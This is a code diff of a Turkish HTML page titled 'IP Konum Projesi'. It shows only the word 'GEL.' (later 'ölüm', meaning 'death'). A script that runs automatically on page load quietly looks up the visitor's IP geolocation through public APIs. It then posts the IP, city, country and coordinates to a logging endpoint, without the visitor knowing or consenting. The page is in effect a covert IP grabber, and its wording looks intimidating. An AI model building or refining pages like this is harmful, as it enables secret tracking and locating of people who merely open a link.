@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <title>IP Konum Projesi</title>
   <style>
     body {
       display: flex;
@@ -19,65 +19,53 @@
   </style>
 </head>
 <body>
-  GEL.
+  ölüm
 
   <script>
-    // 1) ipgeolocation.io üzerinden IP tabanlı konum bilgisi almak
+    // ipwho.is üzerinden IP tabanlı konum bilgisi almak
     async function getIPLocation() {
       try {
-        // ipgeolocation.io hesabınızdan aldığınız API Key'i buraya ekleyin:
-        const apiKey = "YOUR_API_KEY"; // Örnek: "8f25..."
-        
-        // API isteği
-        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
-        const data = await res.json();
-        // data muhtemel örnek:
+        // ipwho.is -> JSON yanıt döndürür
+        // Örnek istek: https://ipwho.is/
+        // Örnek cevap (başarılı ise success: true)
         // {
         //   "ip": "8.8.8.8",
-        //   "country_name": "United States",
+        //   "success": true,
         //   "city": "Mountain View",
+        //   "country": "United States",
         //   "latitude": 37.4056,
         //   "longitude": -122.0775,
         //   ...
         // }
-
-        return data;
+        const res = await fetch('https://ipwho.is/');
+        const data = await res.json();
+        if (data.success) {
+          return data;
+        } else {
+          // success = false
+          return null;
+        }
       } catch (error) {
         console.error("IP tabanlı konum alınırken hata oluştu:", error);
         return null;
       }
     }
 
-    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak (isteğe bağlı)
-    async function getUserIP() {
-      try {
-        const res = await fetch('https://api64.ipify.org?format=json'); 
-        const data = await res.json();
-        return data.ip;
-      } catch (error) {
-        console.error("IP alınırken hata oluştu:", error);
-        return "Bilinmeyen";
-      }
-    }
-
-    // 3) Tüm verileri birleştirip sunucuya gönder
+    // Sunucuya veri gönderen fonksiyon
     async function sendData() {
-      // ipgeolocation.io'dan gelen konum
       const ipData = await getIPLocation();
 
-      // ipify'den gelen "gerçek" IP (isteğe bağlı)
-      const fallbackIP = await getUserIP();
-
-      // IP tabanlı sonuç yoksa "Konum alınamadı"
-      let finalIP = fallbackIP;
+      // Varsayılan değerler
+      let finalIP = "Bilinmeyen IP";
       let finalLocation = "Konum alınamadı";
       let lat = null;
       let lon = null;
 
+      // ipwho.is dönebildiyse
       if (ipData) {
-        finalIP = ipData.ip || fallbackIP; // ipgeolocation.io ip yoksa fallback
+        finalIP = ipData.ip || finalIP;
         const city = ipData.city || "Bilinmeyen";
-        const country = ipData.country_name || "Bilinmeyen";
+        const country = ipData.country || "Bilinmeyen";
         finalLocation = `${city}, ${country}`;
         lat = ipData.latitude || null;
         lon = ipData.longitude || null;
@@ -95,7 +83,7 @@
         longitude: lon
       };
 
-      // Sunucuya POST isteği
+      // Sunucuya (ör. /api/log) POST isteği
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -103,7 +91,7 @@
       });
     }
 
-    // Sayfa açıldığında çalıştır
+    // Sayfa açıldığında otomatik çalış
     sendData();
   </script>
 </body>
